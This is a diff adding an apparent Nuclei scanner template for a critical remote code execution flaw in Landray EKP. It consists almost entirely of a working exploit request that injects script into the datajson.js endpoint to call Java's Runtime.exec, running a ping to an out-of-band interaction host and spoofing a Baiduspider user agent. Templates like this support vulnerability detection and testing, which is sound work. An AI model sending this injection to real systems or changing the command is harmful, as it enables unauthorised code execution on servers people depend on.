@@ -1,0 +1,29 @@
+id: landray_ekp_datajson_rce
+
+info:
+  name: landray_ekp_datajson_rce
+  author: xiaokp7
+  severity: critical
+  description: write your description here
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20{{interactsh-url}}%22)&type=1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: no-cache
+    Pragma: no-cache
+
+
+  matchers:
+    - type: word
+      part: interactsh_protocol # Confirms the DNS Interaction
+      words:
+        - "dns"
+
+# Generated From WebFuzzer on 2024-04-17 11:15:57
